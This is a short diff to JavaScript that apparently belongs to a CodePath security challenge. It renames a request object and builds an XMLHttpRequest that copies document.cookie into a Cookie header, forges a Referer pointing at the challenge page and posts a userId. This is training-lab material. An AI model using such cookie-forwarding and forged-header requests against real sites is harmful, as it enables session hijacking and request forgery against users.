@@ -18,8 +18,8 @@
             // do something to response
             console.log(this.responseText);
         };
-        client.setRequestHeader("Cookie", document.cookie);
-        client.setRequestHeader("Referer",
+        xhr.setRequestHeader("Cookie", document.cookie);
+        xhr.setRequestHeader("Referer",
             "https://security.codepath.com/challenges/z311736498a13604705d608fb3171ebf49bc18753b0ec34b8dff5e4f9147eb5e.jsp"
         );
         xhr.send('userId=183cb80b98c5db7e87c6a738f46b631ca1432ef1');
